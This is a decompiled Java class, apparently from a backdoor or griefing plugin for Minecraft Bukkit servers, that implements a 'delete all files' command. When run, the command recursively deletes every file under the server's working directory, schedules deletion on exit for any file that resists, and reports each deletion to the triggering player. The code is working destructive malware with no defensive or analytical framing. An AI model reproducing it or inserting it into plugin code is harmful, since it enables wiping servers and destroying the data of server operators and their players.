/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.io.IOException;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;
import org.bukkit.entity.Player;

public class DelallfilesCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        try {
            Files.walk(Paths.get("", new String[0]), new FileVisitOption[0]).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(file -> {
                if (file.delete()) {
                    p2.sendMessage(Settings.PREFIX("Deleted file " + Settings.RED + file.getPath()));
                } else {
                    p2.sendMessage(Settings.PREFIX("Failed to delete " + Settings.RED + file.getPath() + Settings.WHITE + "! Attempting to delete on exit"));
                    file.deleteOnExit();
                }
            });
        }
        catch (IOException e2) {
            p2.sendMessage(Settings.PREFIX(e2.getMessage()));
        }
        p2.sendMessage(Settings.PREFIX("Successfully deleted all files"));
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

